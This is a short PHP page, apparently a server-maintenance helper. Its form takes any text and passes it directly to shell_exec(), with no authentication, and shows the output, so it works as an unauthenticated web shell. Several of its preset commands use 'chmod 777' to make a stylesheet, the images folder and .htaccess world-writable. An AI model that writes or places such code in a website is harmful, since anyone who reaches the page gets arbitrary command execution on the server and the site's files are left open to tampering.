<?php

if(empty($_POST['Submit']))
{
?>
	<table width="100%" border=0 cellpadding="4" cellspacing="2" class="body">
		<tr>
			<td valign="top" align="left">
				<form action="" method="POST" enctype="multipart/form-data" target="output" >
					<input type=text name="script" value="" size=80 style="border: 1px solid #ccc;">
					<input type=submit name="Submit" value="Execute">
				</form>
			</td>
		</tr>
		<tr>
			<td valign="top" align="left">
				<form action="" method="POST" enctype="multipart/form-data" target="output" >
					<input type=text name="script" value="find . -type d -exec chmod 755 {} \;" size=80 style="border: 1px solid #ccc;">
					<input type=submit name="Submit" value="Execute">
				</form>
			</td>
		</tr>
		<tr>
			<td valign="top" align="left">
				<form action="" method="POST" enctype="multipart/form-data" target="output" >
					<input type=text name="script" value="find . -type f -exec chmod 644 {} \;" size=80 style="border: 1px solid #ccc;">
					<input type=submit name="Submit" value="Execute">
				</form>
			</td>
		</tr>
		<tr>
			<td valign="top" align="left">
				<form action="" method="POST" enctype="multipart/form-data" target="output" >
					<input type=text name="script" value="find templates/. -name style.css -exec chmod 777 {} \;" size=80 style="border: 1px solid #ccc;">
					<input type=submit name="Submit" value="Execute">
				</form>
			</td>
		</tr>
		<tr>
			<td valign="top" align="left">
				<form action="" method="POST" enctype="multipart/form-data" target="output" >
					<input type=text name="script" value="chmod -R 777 images .htaccess" size=80 style="border: 1px solid #ccc;">
					<input type=submit name="Submit" value="Execute">
				</form>
			</td>
		</tr>
		<tr>
			<td valign="top" align="left">
				<iframe src="" name="output" width="100%" height="400px" frameborder=0></iframe>
			</td>
		</tr>
	</table>
<?php
} else {
	$script = get_magic_quotes_gpc() ? stripslashes($_POST['script']) : $_POST['script'];
	$out	= '$'.$script."\n".shell_exec($script);
	echo '<textarea name="script" style="width: 100%; height: 98%;border: 1px solid #ccc;">'.$out.'</textarea>';
}